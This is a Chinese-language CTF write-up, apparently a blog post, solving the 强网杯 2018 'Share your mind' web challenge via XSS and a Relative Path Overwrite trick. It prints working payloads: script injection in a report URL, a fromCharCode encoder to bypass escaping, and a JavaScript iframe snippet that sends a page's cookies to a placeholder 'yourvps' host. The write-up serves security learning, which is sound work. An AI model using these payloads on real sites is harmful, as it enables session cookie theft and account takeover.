---

title: 强网杯-Share your mind
comments: true
date: 2018-03-26 22:20:06
tags:
  - writeup
  - web
  - xss
categories:
  - 信息安全
  - writeup
keywords:
  - web
  - xss
  - rpo
---


这周末看了一下神仙们打架，感触颇深，自己还是太菜了！
继续放一个xss的wp吧。感觉也就这块可以搞明白点。
心疼自己。

### 分析题目

拿到题目后，首先先分析一下题目，发现有注册和登录，尝试登录成功后，发现如下几个页面

<!-- more -->


```js
Overview // 显示当前自己所有发帖
Write article // 发帖
Reports // 向网站管理员反馈（只能填写问题所在的url）
Export // 暂时没有
About // 简单的一个介绍页面
```

分析后感觉该题为XSS，因为存在Reports页面，且发送时含有验证码。

尝试发帖，发现发出后，可以创建一个空白页面来放置你所发的帖子。

![mark](https://img.5am3.com/img/180324/3ihEicgHIL.png)

可以发现，此时对敏感字符进行了一些转义。并且标题处含有h1标签。

尝试空标题发帖时，发现可以没有h1标签。

此时，我们有了一个很好的条件，如果该网站存在csp，即可通过在这里写入恶意代码，来造成xss。

### 尝试攻击

首先尝试在report页面发送XSSpayload，最终发现以下payload可用

```html
http://39.107.33.96:20000?sda<script src=yourjs></script>
```

尝试获取cookie，成功获取到以下信息。

![mark](https://img.5am3.com/img/180324/E74ALKFg5K.png)

即：

- 存在v1ewth3report.php页面
- 当前页面cookie设有httponly。

然后尝试打其他的一些js，拖源码等。发现很迷！真的很迷！！基本都没法用。但是这个却是确确实实打回来了。

在确认脚本无误后，认真反思后，感觉自己方法错误。原因如下：

1. 未有效利用到其他页面。
2. 强网杯的题不可能这么简单。
3. 难道有跨域之类的问题（这个一直很迷，自己感觉应该不会的，毕竟都成功一次了）

### 继续尝试

然后继续尝试，想办法用到文章页。即将代码写入该页。

因为有对特殊字符的转义，所以需要我们进行绕过一下。

此时采用`fromCharCode`来进行绕过。脚本如下

```python
str1='youjscode'
payload='eval(String.fromCharCode('
for i in range(len(str1)):
	payload+=str(ord(str1[i]))
	if(i+1<len(str1)):
		payload+=','

payload+='));'
print(payload)
```

生成payload后，可以直接发帖，然后记录下网址。

再次尝试刚刚的payload。

```html
http://39.107.33.96:20000?sda<script src='http://39.107.33.96:20000/index.php/view/article/1234'></script>
```

此时报错，提示`You can only submit my site's url`，于是感觉有戏，可能是他后台的一些匹配导致的。想办法绕过即可。

尝试了ip的10进制，域名解析等。

冥思苦想之后，突然发现，自己是傻了么？

本来就是为了绕过同源，现在搞得又回去了。本来就是一个网站，直接用相对路径不就可以了么？

于是构造以下payload。

```html
http://39.107.33.96:20000?sda<script src='./index.php/view/article/1234'></script>
```

然后成功绕过，正当自己开心之时，等待回显的到来。等啊等，等啊等。依旧没反应。。。

难道又错了么？

此时的自己处于一种懵逼状态，唉，还是太年轻！太弱了。对前端了解还是太浅。搞不明白啊！

于是默默去洗了个澡。回来继续肛。

### 不服！继续！！



是在没有思路了。只好去默默查资料，看一下xss的各种姿势。

而且感觉这题也不像绕csp的，毕竟用户端连个csp都没有，怎么可能管理端再加上。

搜索后发现RPO攻击貌似符合当前情景。

[【技术分析】RPO攻击技术浅析](http://blog.nsfocus.net/rpo-attack/)

**尝试在文章页后添加字符，发现依旧返回文章页。**此时开心的笑了。

然后跟着文章进行复现，最终构造payload如下，即可成功打过去！

```
http://39.107.33.96:20000/index.php/view/article/20530/..%2F..%2F..%2F..%2Findex.php
```

在这里我简单说一下漏洞原因，具体分析大家可以看一下rpo攻击的介绍。

此漏洞利用服务器与前端浏览器的解析不同，从而造成相对资源的引用错误。

> 服务器端：将../解析为上一级目录，进行退回，造成渲染页面为 http://39.107.33.96:20000/index.php



> 客户端浏览器： 将..%2F..%2F..%2F..%2F..%2Findex.php解析为一个文件，此时没有执行退目录的操作
> 所以导致相对资源引入时。
> 认为http://39.107.33.96:20000/index.php/view/article/20530/为该目录，然后进行引入。
> 然后由于路由解析的原因，造成引入未见为恶意代码。



![mark](https://img.5am3.com/img/180326/0ijg516dE1.png)

此时由于该页面引入了js，即造成了rpo漏洞的实现。

然后就可以开心的通过js玩耍了。

最终尝试通过读源码无果（get方式有限制长度，且payload 有限制长度）。

于是又一次开始打cookie。发现hint如下

![mark](https://img.5am3.com/img/180324/0IH1b15mJ4.png)

`HINT=Try to get the cookie of path "/QWB_fl4g/QWB/"`

到这里就简单了，因为已经提示在这个目录下的cookie里有flag

然后构造js脚本如下，

```js
var ad = document.createElement("iframe");
ad.src = "../../../../../QWB_fl4g/QWB/";
ad.id = "frame";
document.body.appendChild(ad);
	ad.onload = function (){window.location.href="http://yourvps/?a="+document.getElementById("frame").contentWindow.document.cookie;
}

```

然后打过去，即可获取到flag。

![mark](https://img.5am3.com/img/180324/GJk8792aJi.png)



### 参考资料



- [【技术分析】RPO攻击技术浅析](http://blog.nsfocus.net/rpo-attack/)
- [2018安恒杯二月赛-web-应该不是 XSS](http://blog.5am3.com/2018/02/25/anheng-2-xss/)